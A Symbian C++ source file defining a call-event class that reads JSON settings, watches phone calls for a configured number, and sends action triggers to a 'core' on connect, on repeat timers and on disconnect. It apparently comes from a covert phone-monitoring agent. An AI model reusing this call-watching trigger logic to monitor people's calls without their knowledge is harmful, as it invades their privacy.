/*
 * EventCall.cpp
 *
 *  Created on: 06/ott/2010
 *      Author: Giovanna
 */

#include "EventCall.h"
#include "Json.h"

CEventCall::CEventCall(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Call, aTriggerId)
	{
	// No implementation required
	}

CEventCall::~CEventCall()
	{
	//__FLOG(_L("Destructor"));
	delete iTimerRepeat;
	delete iCallMonitor;
	//__FLOG(_L("End Destructor"));
	//__FLOG_CLOSE;
	} 

CEventCall* CEventCall::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCall* self = new (ELeave) CEventCall(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventCall* CEventCall::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCall* self = CEventCall::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventCall::ConstructL(const TDesC8& params)
	{
	//__FLOG_OPEN_ID("HT", "EventCall.txt");
	//__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	
	RBuf paramsBuf;
		
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf); 
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve telephone number
		if(rootObject->Find(_L("number")) != KErrNotFound)
			rootObject->GetStringL(_L("number"),iTelNumber);
		else
			iTelNumber.Copy(KNullDesC); 
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			rootObject->GetIntL(_L("end"),iCallParams.iExitAction);
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			//action
			rootObject->GetIntL(_L("repeat"),iCallParams.iRepeatAction);
			//iter
			if(rootObject->Find(_L("iter")) != KErrNotFound)
				rootObject->GetIntL(_L("iter"),iCallParams.iIter);
			//delay
			if(rootObject->Find(_L("delay")) != KErrNotFound)
				{
				rootObject->GetIntL(_L("delay"),iCallParams.iDelay);
				if(iCallParams.iDelay == 0)
					iCallParams.iDelay = 1;
				}
			}
		//retrieve enable flag
		rootObject->GetBoolL(_L("enabled"),iEnabled);
				
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);

	if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
		{
		iTimerRepeat = CTimeOutTimer::NewL(*this);
		iSecondsIntervRepeat = iCallParams.iDelay;
		}
	else
		iTimerRepeat = NULL;
	
	iCallMonitor = CPhoneCallMonitor::NewL(*this);
	}

void CEventCall::StartEventL()
	{
	iEnabled = ETrue;
	
	iWasInMonitoredCall = EFalse;
	
	TBuf<16>  telNumber;
	TInt direction;
	if(iCallMonitor->ActiveCall(direction,telNumber))
		{
		if(iTelNumber.Size()==0)  //we don't have to match a number
			{
			iWasInMonitoredCall = ETrue;
			SendActionTriggerToCoreL();
			//start repeat action
			if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
				{
				iSteps = iCallParams.iIter;
						
				iTimeAtRepeat.HomeTime();
				iTimeAtRepeat += iSecondsIntervRepeat;
				iTimerRepeat->CustomAt(iTimeAtRepeat);
				}
			}
		else					
			{
			if(telNumber.Length()==0)  // private number calling
				{
				return;
				}
			if(MatchNumber(telNumber))
				{
				iWasInMonitoredCall = ETrue;
				SendActionTriggerToCoreL();
				//start repeat action
				if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
					{
					iSteps = iCallParams.iIter;
							
					iTimeAtRepeat.HomeTime();
					iTimeAtRepeat += iSecondsIntervRepeat;
					iTimerRepeat->CustomAt(iTimeAtRepeat);
					}
				}
			}
		}
	iCallMonitor->StartListeningForEvents();
	}

void CEventCall::StopEventL()
	{
	if(iTimerRepeat != NULL)
		iTimerRepeat->Cancel();
	iCallMonitor->Cancel();
	iEnabled = EFalse;
	}

// aNumber.Length()==0  when private number calling
void CEventCall::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber)
	{
	if(!iWasInMonitoredCall)
		{
		if(iTelNumber.Size() == 0)
			{
			// no number to match, trigger action
			iWasInMonitoredCall = ETrue;
			SendActionTriggerToCoreL();
			// Triggers the Repeat-Action
			if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
				{
				iSteps = iCallParams.iIter;
									
				iTimeAtRepeat.HomeTime();
				iTimeAtRepeat += iSecondsIntervRepeat;
				iTimerRepeat->CustomAt(iTimeAtRepeat);
				}
			}
		else
			{
			// there's a number to match
			if(aNumber.Length()==0) // private number, do nothing
				{
				return;
				}
			if(MatchNumber(aNumber))
				{
				iWasInMonitoredCall = ETrue;
				SendActionTriggerToCoreL();
				// Triggers the Repeat-Action
				if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
					{
					iSteps = iCallParams.iIter;
										
					iTimeAtRepeat.HomeTime();
					iTimeAtRepeat += iSecondsIntervRepeat;
					iTimerRepeat->CustomAt(iTimeAtRepeat);
					}
				}
			}
		}
	}

void CEventCall::NotifyDisconnectedCallStatusL()
	{
	if(iWasInMonitoredCall)
		{
		iWasInMonitoredCall = EFalse;
		// Stop the repeat action
		if(iTimerRepeat != NULL)
			iTimerRepeat->Cancel();
		// Trigger the exit action
		if (iCallParams.iExitAction != -1)						
			SendActionTriggerToCoreL(iCallParams.iExitAction);
		}
	}

void CEventCall::NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber)
	{
	//we are not interested in this
	}

TBool CEventCall::MatchNumber(const TDesC& aNumber)
	{
	if(aNumber.Length() <= iTelNumber.Length())
		{
		if(iTelNumber.Find(aNumber) != KErrNotFound)
			{
			return ETrue;
			}
		}
	else
		{
		if(aNumber.Find(iTelNumber) != KErrNotFound)
			{
			return ETrue;
			}
		}
	return EFalse;
	}

void CEventCall::TimerExpiredL(TAny* /*src*/)
	{
	if(iCallParams.iIter == -1)
		{
		// infinite loop
		// restart timer
		iTimeAtRepeat.HomeTime();
		iTimeAtRepeat += iSecondsIntervRepeat;
		iTimerRepeat->CustomAt(iTimeAtRepeat);
		SendActionTriggerToCoreL(iCallParams.iRepeatAction);
		}
	else
		{
		// finite loop
		if(iSteps > 0)
			{
			// still something to do
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->CustomAt(iTimeAtRepeat);
			--iSteps;
			SendActionTriggerToCoreL(iCallParams.iRepeatAction);
			}
		}
	}
